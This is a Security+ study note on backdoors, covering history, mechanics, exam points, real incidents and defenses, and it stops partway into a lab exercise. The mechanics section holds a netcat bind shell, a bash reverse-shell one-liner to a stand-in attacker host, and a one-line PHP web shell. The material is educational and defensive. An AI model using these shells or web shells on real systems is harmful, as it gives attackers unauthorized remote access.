```markdown
---
domain: "offensive-security"
tags: [malware, persistence, backdoor, remote-access, sy0-701, threats]
---
# Backdoor

A **backdoor** is any covert method of bypassing normal authentication, encryption, or access controls in a computer system, network device, or application to obtain persistent unauthorized access. Backdoors may be deliberately introduced by developers or vendors (for debugging, maintenance, or surveillance), planted by attackers after exploitation, or embedded in the supply chain as part of [[Malware]] or tampered firmware. They are distinct from, but frequently combined with, [[Trojan Horse]] programs, [[Rootkit]]s, and [[Remote Access Trojan]]s.

---

## Overview

In classic computer science literature, the concept was popularized by Ken Thompson's 1984 Turing Award lecture *"Reflections on Trusting Trust,"* which demonstrated a self-replicating compiler backdoor that inserted a hidden login credential into the Unix `login` binary without leaving any trace in source code. Thompson's point — that you cannot fully trust code you did not write entirely yourself — still frames modern debates about supply-chain security, signed binaries, and reproducible builds.

A backdoor differs from a regular vulnerability in that it is **intentionally placed or installed** to provide repeatable access. Where an exploit leverages a bug, a backdoor is a feature (from the attacker's or implementer's perspective). The mechanism may be as simple as a hardcoded username/password (*support / support*), as subtle as a cryptographic weakness (the Dual_EC_DRBG PRNG constants suspected of being an NSA-introduced backdoor), or as elaborate as a modified build server injecting malicious code into legitimate software updates (SolarWinds SUNBURST, 2020).

Backdoors are attractive to threat actors because they decouple the noisy, detectable phase of initial exploitation from the long-term quiet phase of access. Once a backdoor is planted, the attacker no longer needs the original vulnerability — patches, credential rotations, or even OS reinstalls may not remove a sufficiently deep implant. UEFI-, BMC-, and hypervisor-level backdoors survive most remediations, which is why Advanced Persistent Threat (APT) groups almost always deploy multiple redundant backdoors after initial compromise.

There is a long history of **vendor backdoors** as well. Juniper Networks disclosed in 2015 that unauthorized code in ScreenOS firewalls (CVE-2015-7755) allowed anyone who knew a specific SSH password to log in as root. Cisco, D-Link, Huawei, and numerous IoT manufacturers have shipped products with hardcoded credentials or undocumented service accounts. Many were labeled as "debug" or "maintenance" features — the distinction between a backdoor and a legitimate support channel ultimately comes down to disclosure and access controls.

In the Security+ worldview, backdoors belong to the family of persistence-oriented threats alongside [[Logic Bomb]]s, [[Rootkit]]s, and [[Trojan Horse]]s, and are a key reason organizations invest in egress monitoring, integrity verification, and supply-chain assurance (SBOMs, code signing, reproducible builds).

---

## How It Works

At the mechanical level, a backdoor must provide three things: **a trigger** (how the attacker activates it), **a channel** (how commands and data move), and **persistence** (how it survives reboot, patching, or user logout).

**1. Network-Listener Backdoors (Bind Shells)**

The simplest form binds a shell to a TCP port. The attacker then connects to that port to receive an interactive session.

```bash
# Victim machine — bind shell on port 4444
nc -lvnp 4444 -e /bin/bash

# Attacker machine — connect in
nc victim.example.com 4444
```

Bind shells are trivially blocked by inbound firewalls, so modern malware strongly favors reverse shells.

**2. Reverse-Connect Backdoors (Reverse Shells)**

The implant initiates an outbound connection to attacker-controlled infrastructure, bypassing most inbound firewall rules and NAT traversal problems:

```bash
# Attacker — listener
nc -lvnp 443

# Victim — reverse shell one-liner
bash -i >& /dev/tcp/attacker.example.com/443 0>&1
```

Equivalent Windows PowerShell one-liners using `System.Net.Sockets.TCPClient` are frequently observed in the wild. Callback traffic commonly uses ports 80, 443, or 53 to blend with legitimate egress; HTTPS, DNS, and ICMP are common carriers (see [[DNS Tunneling]]).

**3. Web Shells**

On a web server, an attacker drops a small server-side script that executes arbitrary OS commands via HTTP parameters. Example minimal PHP web shell:

```php
<?php system($_GET['c']); ?>
```

Accessed as: `https://victim.tld/uploads/shell.php?c=id`

Web shells are the dominant backdoor technique on compromised Internet-facing servers. Long-running families include China Chopper, WSO, r57, and ASPX-based variants targeting IIS.

**4. Persistence Mechanisms**

The backdoor binary alone is useless if it dies on reboot. Common persistence techniques by platform:

- **Linux:** `systemd` unit files in `/etc/systemd/system/`, cron jobs in `/etc/cron.d/`, shell rc files (`~/.bashrc`), SSH `authorized_keys`, `LD_PRELOAD` hijacking.
- **Windows:** Registry Run/RunOnce keys (`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`), Scheduled Tasks, Services, WMI event subscriptions, DLL search-order hijacking, startup folder.
- **Firmware/UEFI:** LoJax, MoonBounce, and CosmicStrand families implant in SPI flash, surviving full OS reinstallation.

**5. Authentication Bypass Backdoors**

Rather than spawning a shell, some backdoors patch an authentication routine to accept a magic value. The Juniper ScreenOS case hardcoded the string `<<< %s(un='%s') = %u` as a universal SSH/Telnet password. The XZ Utils backdoor (CVE-2024-3094) hooked OpenSSH's RSA key verification via `IFUNC` resolvers to allow pre-authentication remote code execution for anyone holding the attacker's private key.

**6. Triggered / Dormant Backdoors**

Some backdoors activate only on a specific packet ("port knocking"), a magic cookie in an HTTP header, or a crafted DNS query — allowing the implant to appear completely inert during automated scans and monitoring.

**7. C2 Frameworks**

Command-and-control protocols ([[Command and Control]]) layered on top of the channel give attackers structured capabilities: file upload/download, keystroke logging, lateral movement, and credential theft. Frameworks like Cobalt Strike, Sliver, Metasploit Meterpreter, and Empire package all of the above and are used by both red teams and real-world threat actors.

---

## Key Concepts

- **Bind Shell vs. Reverse Shell:** A bind shell listens on the victim machine and waits for the attacker to connect inbound; a reverse shell makes the victim connect outbound to the attacker. Reverse shells dominate real-world usage because egress traffic is usually far less restricted than ingress.
- **Persistence:** The property that a backdoor survives reboots, logoffs, and patches. Persistence mechanisms are tracked by MITRE ATT&CK under tactic **TA0003** and include registry modification, scheduled tasks, and service installation.
- **Hardcoded Credentials:** Static usernames, passwords, or cryptographic keys embedded in software or firmware that grant access regardless of configuration. Classified as **CWE-798** (Use of Hard-coded Credentials) and treated by CompTIA as a backdoor by definition.
- **Supply-Chain Backdoor:** A backdoor introduced during development, build, or distribution of legitimate software, affecting every downstream consumer. Examples include SolarWinds SUNBURST (2020), XZ Utils (2024), and CCleaner (2017).
- **Web Shell:** A server-side script that turns a compromised web application into a remote command interpreter, typically delivered via file-upload flaws, RCE vulnerabilities, or CMS plugin abuse.
- **Rootkit vs. Backdoor:** A [[Rootkit]] hides the presence of code or malicious activity; a backdoor provides covert access. They are complementary — rootkits are frequently deployed specifically to conceal backdoors from administrators and security tools.
- **RAT (Remote Access Trojan):** A user-mode backdoor with a rich feature set for the operator (file manager, keylogger, webcam access, etc.). Examples include DarkComet, njRAT, and Quasar. All RATs are backdoors; not all backdoors are RATs.
- **C2 (Command and Control):** The infrastructure and protocol the attacker uses to issue commands and receive output through the backdoor channel, often disguised as legitimate web or DNS traffic.

---

## Exam Relevance

On the **SY0-701** exam, backdoors appear primarily in **Domain 2.4 (Analyze indicators of malicious activity)** and **Domain 2.1 (Compare common threat actors and motivations)**. Key exam points:

- **Distinguish backdoor, logic bomb, Trojan, rootkit, and RAT.** A common question presents a scenario and asks which term *best* describes it. A Trojan tricks the user into running it; a backdoor provides persistent access *after* the system is compromised. They often co-occur — the Trojan is the delivery vehicle, the backdoor is the payload.
- **Hardcoded credentials are backdoors**, whether or not the vendor calls them a "maintenance interface." CompTIA treats any static, undocumented credential as a backdoor without exception.
- Recognize the **supply-chain attack** pattern: legitimate software update → malicious payload injected at build time → backdoor deployed at scale. SolarWinds is the canonical exam case study.
- Be able to identify behavioral indicators: **unexpected listening ports**, **unusual outbound connections at regular intervals (beaconing)**, **scheduled tasks of unknown origin**, **new or modified services**, **additions to `authorized_keys`**, and **web server scripts in upload directories**.
- Expect questions pairing backdoors with **defense-in-depth** controls — specifically [[Egress Filtering]], [[Application Allowlisting]], and [[File Integrity Monitoring]].
- **Gotcha:** A maintenance hook left in production code by a well-meaning developer is still a backdoor on the exam. Intent does not change the classification.
- **Gotcha:** The exam may describe a [[Trojan Horse]] scenario that results in a backdoor being installed. The *threat type* is a Trojan; the *persistence mechanism* installed is a backdoor — know which the question is asking about.

---

## Security Implications

**Notable real-world incidents:**

- **SolarWinds SUNBURST (CVE-2020-10148, Dec 2020):** Trojanized `SolarWinds.Orion.Core.BusinessLayer.dll` was signed with a valid SolarWinds certificate and distributed as a legitimate update. Approximately 18,000 organizations received the backdoored build; roughly 100 were selected for hands-on second-stage exploitation targeting government agencies and Fortune 500 companies. Attributed to APT29 (Cozy Bear / SVR).
- **XZ Utils Backdoor (CVE-2024-3094, Mar 2024):** Malicious code introduced over approximately two years by a long-term open-source maintainer persona ("Jia Tan") into the `liblzma` compression library. The backdoor hijacked OpenSSH's authentication path via `IFUNC` resolvers on systemd-linked distributions, enabling pre-authentication RCE for whoever held the attacker's private key. Discovered by Microsoft engineer Andres Freund after noticing a 500 ms sshd login delay — widely considered one of the closest supply-chain near-misses in open-source history.
- **Juniper ScreenOS (CVE-2015-7755 / CVE-2015-7756, Dec 2015):** Unauthorized code in production ScreenOS firmware granted universal SSH root access via a hardcoded password and weakened VPN traffic encryption, allowing passive decryption of VPN sessions. Widely attributed to nation-state actors.
- **Dual_EC_DRBG (2007–2013):** A NIST-standardized pseudo-random number generator with elliptic curve constants that, if chosen by the holder of a specific private key, could predict generator output — a mathematical cryptographic backdoor. Snowden disclosures in 2013 confirmed NSA involvement; RSA Security had made the algorithm the default in its BSAFE toolkit following a $10M contract.
- **D-Link Authentication Bypass (CVE-2013-6027):** The HTTP User-Agent string `xmlset_roodkcableoj28840ybtide` ("edit by 04882 joel backdoor" reversed) bypassed authentication entirely on multiple D-Link router models, granting full administrative access.
- **CCleaner / ShadowPad (2017):** Piriform's build server was compromised; 2.27 million users received a backdoored installer. A second-stage payload specifically targeted technology companies including Intel, VMware, and Cisco.

Detection is genuinely difficult. Properly engineered backdoors emit low-volume, infrequent, encrypted traffic that resembles legitimate telemetry or CDN communication. Signature-based antivirus is largely ineffective against custom implants. Behavioral analytics, anomalous egress patterns, and integrity baselines form the realistic detection surface.

---

## Defensive Measures

- **Egress filtering and outbound proxy inspection.** Default-deny outbound firewall rules eliminate the majority of reverse-shell and C2 channels. Inspect TLS egress via a man-in-the-middle proxy (Squid with SSL Bump, Palo Alto App-ID, or Zscaler) where feasible.
- **Endpoint Detection and Response (EDR).** Tools including Microsoft Defender for Endpoint, CrowdStrike Falcon, SentinelOne, and open-source Wazuh with Velociraptor detect persistence artifacts, suspicious process trees (`w3wp.exe → cmd.exe`), and unusual network connections.
- **File Integrity Monitoring (FIM).** AIDE, Tripwire, Wazuh FIM, or Osquery with `file_events` detect modifications to `/etc/passwd`, `authorized_keys`, system binaries, service configurations, and web root directories. Run baselines after a clean build; alert on deviations.
- **Application allowlisting.** Windows Defender Application Control (WDAC), AppLocker, or Linux `fapolicyd` prevent execution of unsigned or unknown binaries — stopping most dropped backdoors cold before they can establish a channel.
- **Code signing and SBOM.** Require signed binaries and firmware images; maintain a Software Bill of Materials (SBOM) per CISA and Executive Order 14028 guidance; verify supply-chain integrity using Sigstore, `cosign`, and SLSA attestations; use Syft and Grype for SBOM generation and vulnerability scanning.
- **Principle of Least Privilege and credential hygiene.** Rotate and audit service accounts; prohibit shared or default credentials; enforce [[Multi-Factor Authentication]] on all remote access channels including SSH (use certificate-based auth; disable password auth).
- **Network segmentation.** Microsegmentation and zero-trust architectures contain a backdoor's blast radius even after initial compromise. A beaconing implant on a segmented host cannot reach the domain controller.
- **Patch and replace end-of-life firmware.** Many hardware backdoors reside in devices the vendor no longer updates — SOHO routers, IP cameras, legacy PLCs, and IoT sensors. Inventory and replace; do not expose them to the Internet.
- **Proactive threat hunting.** Query regularly for new services, unknown scheduled tasks, `LD_PRELOAD` entries, WMI event subscriptions, additions to `authorized_keys`, and unusual outbound connections. Tools: Velociraptor VQL, OSQuery, Hunting ELK (HELK), and RITA for beacon detection against Zeek logs.

---

## Lab / Hands-On

> ⚠️ All exercises below must be performed in an **isolated lab network** (e.g., the [YOUR-LAB] homelab `dmz-lab` VLAN with no Internet routing). Never run these on production systems or without explicit authorization.

**1. Build and detect a reverse shell (Kali → Ubuntu VM)**

```bash
# Attacker — Kali listener
sudo nc -lvnp 4444